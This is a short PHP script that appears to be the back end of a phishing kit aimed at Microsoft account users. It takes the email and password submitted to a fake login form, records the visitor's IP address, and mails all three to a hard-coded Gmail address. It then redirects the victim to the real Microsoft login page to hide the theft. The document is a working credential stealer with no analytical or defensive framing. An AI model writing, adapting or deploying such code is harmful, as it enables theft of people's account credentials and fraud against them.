<?php
if ($_POST['nextPrev(1)'])
{// do the emailing commands here 
header ("Location:https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1526372916&rver=6.7.6643.0&wp=MBI_SSL&wreply=https%3a%2f%2fproducts.office.com%2fen-ZA%2f%3fms.url%3doffice365com&lc=7177&id=290950&aadredir=1");
}
$to= "obill8252@gmail.com";
$subject ="2019 view";


$password =$_POST['password'] ;
$email =$_POST['email'] ;

$ip = $_SERVER ["REMOTE_ADDR"];




$body ="
email = $email
Password = $password
IP Address =  $ip


 .";






mail ($to, $subject, $body ,$header);




Echo""


?>